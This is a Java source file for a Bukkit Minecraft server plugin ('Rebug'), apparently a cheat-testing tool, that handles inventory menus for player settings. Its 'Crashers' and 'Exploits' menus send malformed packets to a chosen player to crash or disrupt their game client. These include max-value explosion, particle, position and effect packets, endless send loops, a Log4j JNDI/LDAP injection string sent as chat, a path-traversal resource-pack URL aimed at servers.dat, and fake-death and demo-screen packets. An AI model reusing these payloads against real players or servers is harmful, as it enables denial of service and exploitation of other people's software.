package me.killstorm103.Rebug.Events;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;


import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Commands.Menu;
import me.killstorm103.Rebug.Main.Rebug;
import me.killstorm103.Rebug.Utils.PT;
import me.killstorm103.Rebug.Utils.User;
import net.minecraft.server.v1_8_R3.BlockPosition;
import net.minecraft.server.v1_8_R3.ChatComponentText;
import net.minecraft.server.v1_8_R3.EnumDirection;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.MobEffect;
import net.minecraft.server.v1_8_R3.Packet;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;


public class EventMenus implements Listener
{
	private Packet<?> packet = null;
	@SuppressWarnings("unused")
	private Location position;
	private void CrashSendPacket (CommandSender sender, Player player, String mode, String spawncrashmode)
	{
		packet = null;
		position = player.getLocation();
		if (mode.equalsIgnoreCase("Server")) // Test in dev
		{
			packet = new PacketPlayOutCollect(player.getEntityId(), Integer.MAX_VALUE);
			for (int i = 0; i < Integer.MAX_VALUE; i ++)
			PT.SendPacket(player, packet);
			PT.Log(sender, "trying Server Crasher!");
		}
		if (mode.equalsIgnoreCase("Test"))
		{
			ItemStack item = Reset(new ItemStack(Material.ANVIL, 1));
			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
			item.setItemMeta(itemMeta);
			player.setItemInHand(item);
			player.updateInventory();
			PT.PlaceItem(player, player.getItemInHand(), new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ()), EnumDirection.UP, .5F, 0F, .5F);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
		    new PacketDataSerializer(Unpooled.buffer()));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
            packet = new PacketPlayOutExplosion(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));
            PT.SendPacket(player, packet);
            PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
			
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
            	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
                PT.SendPacket(player, packet);
            }
            PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			packet = new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500)));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			packet = new PacketPlayOutChat (text, (byte) 1);
			PT.SendPacket(player, packet);
			PT.Log(sender, "Tried using the Log4j Crash Exploit on " + player.getName());
		}
		if (mode.equalsIgnoreCase("illegal Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				packet = new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
				PT.SendPacket(player, packet);
			}
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("illegal Effect"))
		{
			PT.Log(sender, "trying to use illegal Effect crash Exploit on " + player.getName());
			packet = new PacketPlayOutEntityEffect (player.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
			for (int i = 0; i < Integer.MAX_VALUE; i++)
				PT.SendPacket(player, packet);
			
		}
		if (mode.equalsIgnoreCase("SpawnEntity"))
		{
			PT.CrashPlayer(sender, player, spawncrashmode);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		
		
		if (mode.equalsIgnoreCase("ResourcePack"))
		{
			packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the ResourcePack Crash Exploit on " + player.getName());
		}
	}
	private void ExploitSendPacket (CommandSender sender, Player player, String exploit)
	{
		if (exploit.equalsIgnoreCase("ResourcePack"))
		{
			
			//packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
			//PT.SendPacket(player, packet);
			player.setResourcePack("level://../servers.dat");
			PT.Log(sender, "tried using the ResourcePack exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("force sleep"))
		{
			packet = new PacketPlayOutBed(PT.getEntityPlayer(player), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Force Sleep exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("demo"))
		{
			packet = new PacketPlayOutGameStateChange(5, 0);
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Demo exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("fake death")) 
		{
			packet = new PacketPlayOutEntityStatus(PT.getEntityPlayer(player), (byte) 3);
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Fake Death exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("Test"))
		{
			//player.openInventory(PT.createInventory(player, InventoryType.CREATIVE, "Penis"));
			PT.Log(sender, "tried using the test exploit on " + player.getName());
		}
	}
	
	public void Command (String command)
	{
		Bukkit.dispatchCommand(Bukkit.getServer().getConsoleSender(), "rebug " + command);
	}
	public void Command (Player sender, String command)
	{
		Bukkit.dispatchCommand(sender, "rebug " + command);
	}
	private ArrayList<String> lore = new ArrayList<>();
	private ItemMeta itemMeta = null;
	private ItemStack item = null;
	
	private ItemStack Reset (ItemStack item)
	{
		this.item = (ItemStack) (this.itemMeta =  null);
		lore.clear();
		this.item = item;
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
	private void Refresh (Player player, String menu)
	{
		Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
        {
            @Override
            public void run()
            {
            	Command(player, menu);
            }
        }, 0L);
	}
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onMenu (InventoryClickEvent e)
	{
		ItemMeta meta = null;
		String MenuName = ChatColor.stripColor(e.getView().getTitle());
		Inventory inventory = null;
		ItemStack item = e.getCurrentItem(), getCursor = e.getCursor();
		if (MenuName != null)
		{
			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && MenuName.equalsIgnoreCase("Items") && item.getType() == Material.WOOL && item.getData().getData() == 14 && getCursor != null)
			{
				e.setCursor(null);
				e.setCancelled(true);
				return;
			}
			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && (MenuName.equalsIgnoreCase("Items") || MenuName.equalsIgnoreCase("Crashers") || MenuName.equalsIgnoreCase("Exploits")) && item.getType() == Material.STAINED_GLASS_PANE)
			{
				e.setCancelled(true);
				return;
			}
		}
		if (MenuName != null && e.getView().getPlayer() != null)
		{
			if (e.getCurrentItem() != null && e.getCurrentItem().getItemMeta() != null)
			{
				meta = e.getCurrentItem().getItemMeta();
				String ItemName = ChatColor.stripColor(meta.getDisplayName());
				Player player = (Player) e.getView().getPlayer();
				User user = Rebug.getUser(player);
				if (user == null)
				{
					PT.KickPlayer(player, PT.RebugsUserWasNullErrorMessage("in " + MenuName));
					return;
				}
				if (MenuName.equalsIgnoreCase("Exploits"))
				{
					if (ItemName != null)
					{
						ExploitSendPacket(Menu.sender, Menu.player, ItemName);
						e.setCancelled(true);
					}
				}
				if (MenuName.equalsIgnoreCase("Vanilla Fly Checks"))
				{
					if (e.getClickedInventory() != player.getInventory())
					{
						e.setCancelled(true);
						if (item != null && ItemName != null && item.getType() != Material.STAINED_GLASS_PANE)
						{
							if (ItemName.equalsIgnoreCase("Back"))
							{
								Refresh(player, "menu settings");
								return;
							}
							if (ItemName.equalsIgnoreCase("1.8.x"))
							{
								user.setVanilla1_8FlyCheck(!user.isVanilla1_8FlyCheck());
							}
							if (ItemName.equalsIgnoreCase("1.9+"))
							{
								user.setVanilla1_9FlyCheck(!user.isVanilla1_9FlyCheck());
							}
							Refresh(player, "menu VanillaFlyChecks");
						}
						
					}
				}
				if (MenuName.equalsIgnoreCase("Rebug Settings") && (player.hasPermission("me.killstorm103.rebug.server_owner") || player.hasPermission("me.killstorm103.rebug.server_admin")) && e.getClickedInventory() != player.getInventory())
				{
					e.setCancelled(true);
					
					if (item != null && ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
					{
						if (ItemName.equalsIgnoreCase("Debug"))
							Rebug.debug =! Rebug.debug;
						
						if (ItemName.equalsIgnoreCase("Debug To Ops Only"))
						{
							Rebug.debugOpOnly =! Rebug.debugOpOnly;
							if (Rebug.debugOpOnly && (!player.hasPermission("me.killstorm103.rebug.server_owner") || !player.hasPermission("me.killstorm103.rebug.server_admin") || !player.isOp()))
								player.sendMessage(Rebug.RebugMessage + "Warning your not opped so you won't get debug messages!");
						}
						
						if (ItemName.equalsIgnoreCase("Reload Config"))
						{
							try
							{
								Rebug.getGetMain().getConfig().load(Rebug.getGetMain().getCustomConfigFile());
								Rebug.getGetMain().getConfig().save(Rebug.getGetMain().getCustomConfigFile());
								player.sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
							}
							catch (Exception fG) 
							{
								fG.printStackTrace();
							}
						}
						else
							Refresh(player, "menu " + (ItemName.equalsIgnoreCase("Back") ? "settings" : "Rebug_Settings"));
					}
				}
				if (MenuName.equalsIgnoreCase("Player Settings"))
				{
					if (e.getClickedInventory() != player.getInventory())
					{
						e.setCancelled(true);
						if (item != null && ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
						{
							if (ItemName.equalsIgnoreCase("Rebug Settings"))
							{
								Refresh(player, "menu Rebug_Settings");
								return;
							}
							if (ItemName.equalsIgnoreCase("Hunger"))
							{
								user.setEats (!user.isEats());
							}
							if (ItemName.equalsIgnoreCase("Fall Damage"))
							{
								user.setFallDamage(!user.FallDamage());
							}
							if (ItemName.equalsIgnoreCase("Exterranl Damage"))
							{
								user.setDamageable(!user.isDamageable());
							}
							if (ItemName.equalsIgnoreCase("Vanilla Fly Checks"))
							{
								Command(player, "menu VanillaFlyChecks");
								return;
							}
							if (ItemName.equalsIgnoreCase("Potions"))
							{
								user.setPotionEffects(!user.isPotionEffects());
							}
							if (ItemName.equalsIgnoreCase("Auto Refill Blocks"))
							{
								user.setAutoRefillBlocks(!user.isAutoRefillBlocks());
							}
							if (ItemName.equalsIgnoreCase("Notify On Flying Kick"))
							{
								user.setNotifyFlyingKick(!user.isNotifyFlyingKick());
							}
							if (ItemName.equalsIgnoreCase("AllowAT"))
							{
								user.setMentions(!user.Mentions());
							}
							if (ItemName.equalsIgnoreCase("Flags"))
							{
								user.setShowFlags(!user.isShowFlags());
							}
							if (ItemName.equalsIgnoreCase("Kick"))
							{
								user.setKickable(!user.isKickable());
							}
							if (ItemName.equalsIgnoreCase("Hide All Online Players"))
							{
								user.setHideOnlinePlayers(!user.HideOnlinePlayers());
							}
							if (ItemName.equalsIgnoreCase("Direct Messages"))
							{
								user.setAllowDirectMessages(!user.AllowDirectMessages());
							}
							Refresh(player, "menu settings");
						}
					}
				}
				if (MenuName.equalsIgnoreCase("Items"))
				{
					if (e.getClickedInventory() != player.getInventory()) 
					{
						e.setCancelled(true);
						if (PT.isInventoryFull(player))
						{
							player.sendMessage(Rebug.RebugMessage + "Your Inventory's full make some space!");
							return;
						}
						for (int i = 0; i < player.getInventory().getSize(); i ++)
						{
							if (player.getInventory().getItem(i) == null || player.getInventory().getItem(i) == item && item.getAmount() < item.getMaxStackSize())
							{
								player.getInventory().setItem(i, item);
								break;
							}
						}
					}
				}
				if (MenuName.equalsIgnoreCase("Crashers"))
				{
					if (ItemName != null)
					{
						if (!player.isOp() && ItemName.equalsIgnoreCase("illegal Effect"))
						{
							player.sendMessage("because this crashes the server to you have to Opped to use it!");
							e.setCancelled(true);
							return;
						}
						if (ItemName.equalsIgnoreCase("spawn entity crashers"))
						{
							player.closeInventory();
							inventory = PT.createInventory(player, 9, ChatColor.RED + "Spawn Entity Crashers");
							item = Reset(new ItemStack(Material.WOOL, 1, (short) 14));
							itemMeta.setDisplayName(ChatColor.BLUE + "Back");
							lore.add("takes you back to the");
							lore.add("crashers menu.");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(0, item);
							
							item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
							itemMeta.setDisplayName(ChatColor.RED + "Creeper");
							lore.add("Creeper Crash Exploit!");
							lore.add("");
							lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(1, item);
							
							item = Reset(new ItemStack(Material.MOB_SPAWNER));
							itemMeta.setDisplayName(ChatColor.RED + "Test");
							lore.add("Test Crash Exploit!");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(2, item);
							
							player.openInventory(inventory);
							e.setCancelled(true);
							return;
						}
						CrashSendPacket(Menu.sender, Menu.player, ItemName, null);
						e.setCancelled(true);
					}
				}
				if (MenuName.equalsIgnoreCase("Spawn Entity Crashers"))
				{
					if (ItemName != null)
					{
						if (ItemName.equalsIgnoreCase("Back"))
						{
							e.setCancelled(true);
							player.closeInventory();
							Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
				            {
				                @Override
				                public void run()
				                {
				                	Command(player, "menu crashers " + Menu.player.getName());
				                }
				            }, 2L);
							return;
						}
						CrashSendPacket(Menu.sender, Menu.player, "SpawnEntity", ItemName);
						e.setCancelled(true);
					}
				}
			}
		}
	}
}
